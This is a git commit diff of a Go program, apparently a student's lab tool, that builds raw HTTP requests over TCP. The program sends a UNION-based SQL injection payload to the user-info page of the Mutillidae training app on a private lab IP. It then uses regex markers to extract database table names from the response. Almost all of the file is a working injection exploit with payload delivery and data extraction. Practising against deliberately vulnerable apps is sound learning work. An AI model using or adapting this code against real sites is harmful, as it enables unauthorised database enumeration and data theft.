61bc13cea1fea62ba73feae70b81c32b1ce7906a
joerge03 <joergemichaels@gmail.com>
2025-03-25 15:46:03 +0800

    reformat httpoverTcp

--- tune2/net/dvwa/httpOverTcp.go
+++ tune2/net/dvwa/httpOverTcp.go
@@ -1,19 +1,104 @@
 package main
 
 import (
+	"encoding/hex"
 	"fmt"
 	"io"
 	"log"
 	"net"
 	"net/url"
+	"regexp"
 	"strings"
 )
 
 var payloads = []string{
-	"' test",
+	"e' UNION ALL SELECT NULL,CONCAT(0x717a7a7671,IFNULL(CAST(table_name AS NCHAR),0x20),0x7170706271),NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6f776173703130)-- -",
 }
 
+var HexFirst = "0x717a7a7671"
+var HexSecond = "0x7170706271"
+
 // CREATE AN ERROR INDICATOR COMPARE THE PAGE ON WHAT CHANGE AND READ FROM THAT
+
+// type Query struct {
+// 	Host          string
+// 	Method        string
+// 	ContentType   string
+// 	Body          string
+// 	ContentLength int32
+// }
+
+func NewQuery(cType, path, host, body string) string {
+	var request strings.Builder
+	method := "POST"
+	bodyLength := len(body)
+
+	reg, err := regexp.Compile("FUZZ")
+	if err != nil {
+		log.Panic(err)
+	}
+	fPath := reg.ReplaceAllString(path, url.QueryEscape(body))
+	request.WriteString(fmt.Sprintf("%s %s\n HTTP/1.1 \r\n", method, fPath))
+	request.WriteString(fmt.Sprintf("Host: %s \r\n", host))
+	request.WriteString(fmt.Sprintf("Content-Type: %s \r\n", cType))
+	if bodyLength > 0 {
+		request.WriteString(fmt.Sprintf("Content-Length: %d \r\n", bodyLength))
+	}
+	request.WriteString("\r\n")
+	return request.String()
+}
+
+func hexToString(str string) (string, error) {
+	if strings.HasPrefix(str, "0x") || strings.HasPrefix(str, "0X") {
+
+		fmt.Println(str, str[2:])
+		str = str[2:]
+	}
+	bytes, err := hex.DecodeString(str)
+	if err != nil {
+		return "", err
+	}
+
+	return string(bytes), nil
+}
+
+func process(conn *net.Conn, req string) (string, error) {
+	_, err := (*conn).Write([]byte(req))
+	if err != nil {
+		return "", err
+	}
+
+	response, err := io.ReadAll(*conn)
+	if err != nil {
+		return "", err
+	}
+
+	hexFirstStr, err := hexToString(HexFirst)
+	if err != nil {
+		log.Panic(err)
+	}
+	hexSecondStr, err := hexToString(HexSecond)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	patern := regexp.MustCompile(fmt.Sprintf("%s(.*?)%s", hexFirstStr, hexSecondStr))
+
+	formattedRes := patern.FindAllStringSubmatch(string(response), -1)
+
+	var gatheredString []string
+	for _, res := range formattedRes {
+		gatheredString = append(gatheredString, res[1])
+	}
+
+	str := strings.Join(gatheredString, "\n")
+
+	// if len(str) >0 {
+	// 	return str,
+	// }
+
+	return str, nil
+}
 
 func main() {
 	conn, err := net.Dial("tcp", "172.16.21.129:80")
@@ -21,55 +106,16 @@ func main() {
 		log.Panicf("Unable to dial, %v", err)
 	}
 	defer conn.Close()
-
-	// submitQuery := "user-info-php-submit-button=View+Account+Details"
-
-	payload2 := "e' UNION ALL SELECT NULL,CONCAT(0x717a7a7671,IFNULL(CAST(table_name AS NCHAR),0x20),0x7170706271),NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6f776173703130)-- -"
-
-	// fmt.Println(url.QueryEscape(payload))
-	// payload := "e%27 UNION ALL SELECT NULL,CONCAT(0x717a7a7671,IFNULL(CAST(table_name AS NCHAR),0x20),0x7170706271),NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6f776173703130)-- -"
-	// p := strings.Replace(payload, " ", "%20", -1)
-
-	method := "POST"
-	// path := "/mutillidae/index.php?page=user-info.php"
-	queries := fmt.Sprintf("username=%v&password=test", payload2)
-	contentType := "Content-Type: application/x-www-form-urlencoded"
-	body := queries
-
-	contentLength := "Content-Length: 0"
-	if len(body) > 0 {
-		fmt.Println("run")
-		contentLength = fmt.Sprintf("Content-Length: %v", len(body))
-	}
-
-	formattedQueries := fmt.Sprintf("/mutillidae/index.php?page=user-info.php&username=%s&password=test&user-info-php-submit-button=View+Account+Details\n", url.QueryEscape(payload2))
-	test := fmt.Sprintln("/mutillidae/index.php?page=user-info.php&username=e%27%20UNION%20ALL%20SELECT%20NULL,CONCAT(0x717a7a7671,IFNULL(CAST(table_name%20AS%20NCHAR),0x20),0x7170706271),NULL,NULL,NULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20(0x6f776173703130)--%20-&password=test&user-info-php-submit-button=View+Account+Details")
-	fmt.Println("default", formattedQueries)
-	fmt.Println("test ", test)
-
-	request := fmt.Sprintf("%s %s HTTP/1.1", method, formattedQueries)
+	path := "/mutillidae/index.php?page=user-info.php&username=FUZZ&password=test&user-info-php-submit-button=View+Account+Details"
+	contentType := "application/x-www-form-urlencoded"
 	host := "172.16.21.129:80"
 
-	var requestBuilder strings.Builder
-	requestBuilder.WriteString(fmt.Sprintf("%s\r\n", request))
-	requestBuilder.WriteString(fmt.Sprintf("%s\r\n", host))
-	requestBuilder.WriteString(fmt.Sprintf("%s\r\n", contentLength))
-	requestBuilder.WriteString(fmt.Sprintf("%s\r\n", contentType))
-	requestBuilder.WriteString("\r\n")
-	// formattedRequest :=
-	// 	fmt.Sprintf("%s\r\n%s\r\n%s\r\n%s\r\n\r\n", request, host, contentType, contentLength)
+	req := NewQuery(contentType, path, host, payloads[0])
 
-	// fmt.Println("request", requestBuilder.String())
-
-	_, err = conn.Write([]byte(requestBuilder.String()))
+	res, err := process(&conn, req)
 	if err != nil {
-		log.Panicf("unable to write %v", err)
+		log.Panic(err)
 	}
-
-	response, err := io.ReadAll(conn)
-	if err != nil {
-		log.Panic("unable to Read all", err)
-	}
-	fmt.Println(string(response))
+	fmt.Println(res)
 
 }
